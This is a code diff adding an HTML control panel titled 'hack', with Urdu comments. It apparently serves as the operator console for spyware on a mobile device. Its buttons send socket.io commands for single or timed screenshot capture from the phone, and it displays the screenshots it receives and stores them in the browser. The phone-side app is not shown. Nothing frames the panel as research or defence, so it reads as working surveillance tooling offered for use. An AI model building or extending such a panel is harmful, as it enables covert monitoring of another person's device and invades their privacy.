@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ur" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>hack</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
+        .panel-container { background: #fff; max-width: 600px; margin: 0 auto; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        .control-group { margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #ddd; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 5px; margin: 5px; }
+        button:hover { background: #0056b3; }
+        button.danger { background: #dc3545; }
+        button.danger:hover { background: #c82333; }
+        input[type="number"] { padding: 10px; font-size: 16px; width: 100px; text-align: center; border-radius: 5px; border: 1px solid #ccc; }
+        #imageGallery { margin-top: 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; }
+        #imageGallery img { max-width: 100%; border: 3px solid #333; border-radius: 8px; }
+    </style>
+</head>
+<body>
+
+    <div class="panel-container">
+        <h2>hack</h2>
+        
+        <div class="control-group">
+            <button onclick="getSingleCapture()">Get Capture (Single)</button>
+        </div>
+
+        <div class="control-group">
+            <input type="number" id="timeMinutes" placeholder="Minutes" min="1">
+            <button onclick="startTimerCapture()">Start Capture (Timer)</button>
+        </div>
+
+        <div>
+            <button class="danger" onclick="clearScreen()">Clear Screen</button>
+        </div>
+    </div>
+
+    <div id="imageGallery"></div>
+
+    <script>
+        const socket = io();
+        const imageGallery = document.getElementById('imageGallery');
+
+        // پیج ریلوڈ ہونے پر پرانی تصویریں واپس لانا
+        window.onload = () => {
+            const savedImages = JSON.parse(localStorage.getItem('savedCaptures')) || [];
+            savedImages.forEach(src => addImageToUI(src));
+        };
+
+        // سنگل کیپچر کی کمانڈ بھیجنا
+        function getSingleCapture() {
+            socket.emit('request_single_shot');
+        }
+
+        // ٹائمر کی کمانڈ بھیجنا
+        function startTimerCapture() {
+            const minutes = document.getElementById('timeMinutes').value;
+            if(!minutes || minutes <= 0) {
+                alert('Please Enter Time!');
+                return;
+            }
+            socket.emit('request_timer_stream', { durationMinutes: parseInt(minutes) });
+        }
+
+        // سکرین اور لوکل سٹوریج دونوں کو کلیئر کرنا
+        function clearScreen() {
+            imageGallery.innerHTML = '';
+            localStorage.removeItem('savedCaptures');
+        }
+
+        // تصویر کو سکرین پر شو کروانا (نئی تصویر سب سے اوپر آئے گی)
+        function addImageToUI(src) {
+            const img = document.createElement('img');
+            img.src = src;
+            imageGallery.prepend(img);
+        }
+
+        // تصویر کو لوکل سٹوریج میں محفوظ کرنا
+        function saveToLocalStorage(src) {
+            let savedImages = JSON.parse(localStorage.getItem('savedCaptures')) || [];
+            savedImages.unshift(src); // نئی تصویر کو شروع میں ڈالیں
+            
+            // صرف آخری 10 تصویریں رکھیں تاکہ میموری فل نہ ہو
+            if(savedImages.length > 10) {
+                savedImages.pop();
+            }
+            localStorage.setItem('savedCaptures', JSON.stringify(savedImages));
+        }
+
+        // موبائل ایپ سے جب تصویر آئے گی تو یہ فنکشن چلے گا
+        socket.on('receive_screenshot', (data) => {
+            if(data && data.image) {
+                addImageToUI(data.image);
+                saveToLocalStorage(data.image);
+            }
+        });
+    </script>
+</body>
+</html>
